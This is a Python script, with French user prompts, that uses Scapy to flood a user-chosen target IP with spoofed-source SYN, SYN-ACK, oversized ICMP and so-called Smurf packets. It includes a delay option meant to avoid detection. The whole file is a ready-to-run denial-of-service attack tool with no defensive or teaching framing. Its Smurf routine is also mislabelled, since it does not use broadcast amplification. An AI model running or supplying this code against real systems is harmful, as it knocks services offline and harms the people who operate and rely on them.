from scapy.all import IP, ICMP, TCP, send, Raw
import random
import time

def generate_random_ip():
    """Generate a random IPv4 address."""
    return '.'.join(str(random.randint(1, 255)) for _ in range(4))

def send_packet(packet, delay):
    """Send the packet with an optional delay to avoid pattern detection."""
    send(packet, verbose=0)
    if delay > 0:
        time.sleep(delay)

def attack_syn_flood(target_ip, target_port, num_packets, delay):
    """Send SYN flood attack."""
    for _ in range(num_packets):
        src_ip = generate_random_ip()
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send_packet(packet, delay)

def attack_pod(target_ip, num_packets, delay):
    """Send Ping of Death (PoD) attack."""
    for _ in range(num_packets):
        src_ip = generate_random_ip()
        load = b"A" * 6000  # Payload size to simulate a large ICMP packet
        packet = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load)
        send_packet(packet, delay)

def attack_syn_ack(target_ip, target_port, num_packets, delay):
    """Send SYN-ACK flood attack."""
    for _ in range(num_packets):
        src_ip = generate_random_ip()
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
        send_packet(packet, delay)

def attack_smurf(target_ip, num_packets, delay):
    """Send Smurf attack (ICMP flood using victim's IP as source)."""
    for _ in range(num_packets):
        src_ip = generate_random_ip()
        packet = IP(src=src_ip, dst=target_ip) / ICMP()
        send_packet(packet, delay)

def ddos(target_ip, attack_type, num_packets, delay):
    """Perform DDoS attack based on selected type."""
    target_port = 12345  # Default port for TCP-based attacks
    
    if attack_type == "syn_flood":
        attack_syn_flood(target_ip, target_port, num_packets, delay)
    elif attack_type == "pod":
        attack_pod(target_ip, num_packets, delay)
    elif attack_type == "syn_ack":
        attack_syn_ack(target_ip, target_port, num_packets, delay)
    elif attack_type == "smurf":
        attack_smurf(target_ip, num_packets, delay)
    else:
        print(f"Type d'attaque non reconnu: {attack_type}")

if __name__ == "__main__":
    # Demander les informations à l'utilisateur
    target_ip = input("Entrez l'adresse IP cible : ")
    attack_type = input("Entrez le type d'attaque (syn_flood, pod, syn_ack, smurf) : ")
    num_packets = int(input("Entrez le nombre de paquets à envoyer : "))
    delay = float(input("Entrez le délai entre les paquets (en secondes, 0 pour aucun délai) : "))

    # Lancer l'attaque avec les paramètres choisis
    ddos(target_ip, attack_type, num_packets, delay) 